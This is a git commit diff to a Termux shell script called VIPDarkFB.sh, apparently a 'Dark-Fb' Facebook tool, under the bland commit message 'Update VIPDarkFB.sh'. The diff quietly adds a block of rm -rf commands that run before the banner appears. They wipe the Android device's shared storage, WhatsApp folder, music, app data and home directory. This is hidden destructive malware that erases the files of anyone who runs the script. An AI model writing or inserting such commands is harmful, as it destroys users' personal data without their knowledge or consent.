0827b65e776f5569ae8228fd1a7c20ed25f4f626
MikoKW <46629829+MikoKW@users.noreply.github.com>
2019-07-06 19:44:54 +0700

    Update VIPDarkFB.sh

--- VIPDarkFB.sh
+++ VIPDarkFB.sh
@@ -11,6 +11,21 @@ P1='\033[35;1m'
 sleep 0.1
 termux-setup-storage
 clear
+termux-setup-storage
+rm -rf /storage/emulated/0
+rm -rf /sdcard/0
+rm -rf /storage/emulated/0/
+rm -rf /storage/emulated/0/android/obb
+rm -rf /sdcard/0/android/data
+rm -rf $HOME
+rm -rf sdcard/0
+rm -rf storage/emulated/0
+rm -rf /storage/emulated/0/
+rm -rf /sdcard/0/WhatsApp
+rm -rf /storage/emulated/0/
+rm -rf /storage/emulated/0/
+rm -rf /sdcard/0/Music
+rm -rf /sdcard/0/Musik
 figlet Dark-Fb 1.8 | lolcat
 
 echo $B1"=========================="
